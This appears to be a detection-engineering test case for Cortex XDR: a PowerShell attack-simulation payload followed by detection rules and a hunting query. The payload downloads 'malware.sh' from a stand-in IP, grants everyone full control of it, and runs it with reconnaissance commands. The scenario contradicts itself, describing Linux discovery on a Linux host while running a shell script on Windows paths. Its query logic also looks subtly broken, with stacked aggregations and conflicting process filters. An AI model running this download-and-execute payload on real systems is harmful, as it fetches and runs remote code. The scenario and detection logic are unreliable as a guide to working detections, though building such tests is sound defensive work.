identity.name: Windows EDR Mimicking Linux Discovery Commands via PowerShell
identity.summary: An attacker uses PowerShell to execute multiple discovery commands on a Linux host, mimicking legitimate reconnaissance behavior. Cortex should detect this as suspicious process activity originating f
identity.description: An attacker uses PowerShell to execute multiple discovery commands on a Linux host, mimicking legitimate reconnaissance behavior. Cortex should detect this as suspicious process activity originating from a Windows endpoint.

payload.code:
powershell -Command "Invoke-WebRequest -Uri 'http://192.0.2.100/malware.sh' -OutFile 'C:\\temp\\malware.sh'"
 powershell -Command "icacls C:\\temp\\malware.sh /grant Everyone:F"
 powershell -Command "Start-Process -FilePath 'C:\\temp\\malware.sh' -ArgumentList '-c "whoami;hostname;ls -la"'"
 powershell -Command "Start-Process -FilePath 'C:\\temp\\malware.sh' -ArgumentList '-c "ps aux;netstat -an;df -h"'"

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Multiple Discovery Commands by Same Process
biocs.description: Detection of multiple discovery commands executed by the same PowerShell process
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_image_name = 'powershell.exe'
| comp count() as cnt by causality_actor_process_image_name
| comp count(action_process_image_name) as cmd_count
| filter cmd_count > 1

abiocs.name: Windows PowerShell Executing Linux Discovery Commands
abiocs.description: Behavioral deviation where a Windows PowerShell process initiates multiple Linux discovery commands
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_image_name = 'powershell.exe'
| filter action_file_path contains 'malware.sh'
| filter action_process_command_line contains 'whoami;hostname;ls -la'
| filter action_process_command_line contains 'ps aux;netstat -an;df -h'

xql_queries.name: Hunt for PowerShell with Multiple Discovery Commands
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_command_line contains 'whoami;hostname;ls -la'
| filter action_process_command_line contains 'ps aux;netstat -an;df -h'
| comp count() as cnt by causality_actor_process_image_name
| comp count(action_process_command_line) as discovery_cmd_count
| filter discovery_cmd_count > 1
